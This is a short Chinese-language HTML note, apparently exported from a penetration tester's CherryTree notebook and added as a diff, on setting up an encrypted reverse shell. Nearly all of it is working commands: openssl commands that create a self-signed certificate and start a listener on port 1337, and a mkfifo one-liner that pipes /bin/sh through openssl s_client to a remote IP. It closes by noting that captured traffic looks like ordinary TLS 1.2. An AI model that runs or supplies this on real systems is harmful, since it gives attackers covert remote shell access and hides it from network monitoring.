@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>反弹加密shell</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>反弹加密shell</h1><br/><br /><h2>使用 OpenSSL 生成证书自签名证书</h2><br />openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes<br /><br /><br /><br /><br />服务器监听端口<br />openssl s_server -quiet -key key.pem -cert cert.pem -port 1337<br /><br />反弹shell<br /><br />mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 172.16.1.174:1337 &gt; /tmp/s; rm /tmp/s<br /><br /><br /><br />抓包显示为TLS1.2协议流量<br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
